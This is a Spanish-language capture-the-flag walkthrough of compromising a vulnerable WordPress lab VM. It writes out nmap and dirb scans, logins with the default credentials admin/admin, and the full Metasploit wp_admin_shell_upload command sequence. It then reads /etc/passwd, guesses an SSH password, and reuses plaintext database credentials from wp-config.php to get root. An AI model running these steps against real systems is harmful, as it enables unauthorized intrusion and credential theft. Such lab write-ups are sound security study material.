En primer lugar descargamos la máquina virtual de:
<LINKKKKKKKK>

Al iniciarla ya nos dice la ip, procedemos a realizar un escaneo de puertos:

#nmap -A <ip>

Tarda un poco, tiene muchos puertos abiertos (1)
Vemos un puerto 80, accedamos con firefox a ver que vemos, foto de un planeta, dice que clikemos, antes analicemos código fuente (Ctrl+U), dos fotos, descargamos y analizamos metadatos.

#exiftool <foto>

Ejecutamos Dirb a ver que vemos

# dirb http://<ip>

Muchisimos ficheros de wordpress.

Nada que destacar
Recordamos que en el nmap hemos descubierto que tiene un archivo robots.txt, accedemos, nos desvela que tiene wordpress, accedemos, probamos suerte:
Usr: admin
Pwd: admin
Pura suerte (ya es hora de cambiar eso no? xd)

Despues de googlear un rato encontramos en exploit en metasploit llamado wp_admin_shell_upload

# msfconsole
# use exploit/unix/webapp/wp_admin_shell_upload
# set PASSWORD admin
# set USERNAME admin
# set RHOST <ip>
# set TARGETURI /wordpress/
# exploit

Ahora obetenmos el meterpreter: utilizadmos pwd para ver donde nos encontramos (2)
Sabemos que estamos en linux, por tanto vamos a ver que usuarios tiene:

#cat /etc/passwd

Vemos que el único usuario aparte del root es wpadmin (3), vamos a probar a acceder a el mediante ssh.

#ssh wpadmin@<ip>

Nos pide contraseña, probamos con wpadmin (por seguir con la suerte de arriba). ¡Tenemos acceso ssh!
Encontramos la primera flag en el home (4), ahora necesitamos acceso root.

Para conseguirlo primero vamos a ver los directorios de wordpress (ya que todo vino de ahi) a ver que encontramos. Recuerdo que Dirb nos dio muchas pistas, busquemos.

Tras rebuscar un rato encontramos lo siguiente: hay un fichero wp-config.php con los datos de la conexion a la base de datos, tiene datos en texto plano, unos de los datos son:

user: root
password: rootpassword!

Soy un tanto esceptico a que sean las contraseñas del ssh, pero probamos

# ssh root@<ip>

Vale, es la contraseña, somos root

Encontramos la flag en el directorio.

# cat flag.txt
